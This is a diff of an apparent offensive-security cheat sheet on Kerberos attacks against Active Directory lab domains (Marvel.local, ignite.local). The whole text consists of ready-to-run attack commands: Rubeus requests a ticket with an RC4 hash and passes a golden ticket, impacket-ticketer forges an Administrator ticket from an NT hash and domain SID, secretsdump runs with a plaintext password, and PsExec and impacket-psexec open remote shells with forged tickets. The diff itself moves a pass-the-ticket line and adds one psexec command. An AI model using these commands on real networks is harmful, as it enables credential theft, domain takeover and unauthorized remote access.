@@ -12,10 +12,11 @@ misc::cmd
 
 #using the Rubeus
 Rubeus.exe asktgt /domain:Marvel.local /user:Administrator /rc4:f56a8399599f1be040128b1dd9623c29 /ptt
-Rubeus.exe ptt /ticket:golden.kirbi
+
 dir \\<domain-ip>\C$ 
 PsExec.exe \\192.168.1.105 cmd.exe
 
+Rubeus.exe ptt /ticket:golden.kirbi
 
 #using impacket-getTGT
 impacket-getTGT -dc-ip 192.168.154.134 Marvel.local/hawkeye
@@ -70,6 +71,8 @@ python secretsdump.py administrator:Ignite@987@192.168.1.105 -outputfile krb -us
 #using ticketer
 impacket-ticketer -nthash f3bc61e97fb14d18c42bcbf6c3a9055f -domain-sid S-1-5-21-3523557010-2506964455-2614950430 -domain ignite.local Administrator
 export KRB5CCNAME=/root/Tools/impacket/examples/Administrator.ccache
+
+export KRB5CCNAME=Administrator.ccache; impacket-psexec -dc-ip 192.168.154.134 -target-ip 192.168.154.131 -no-pass -k Marvel.local/Administrator@THE-PUNISHER.marvel.local
 
 #convert and transfer the kribi file to windows computer.
 impacket-ticketConverter /root/impacket/examples/Administrator.ccache golden.kirbi
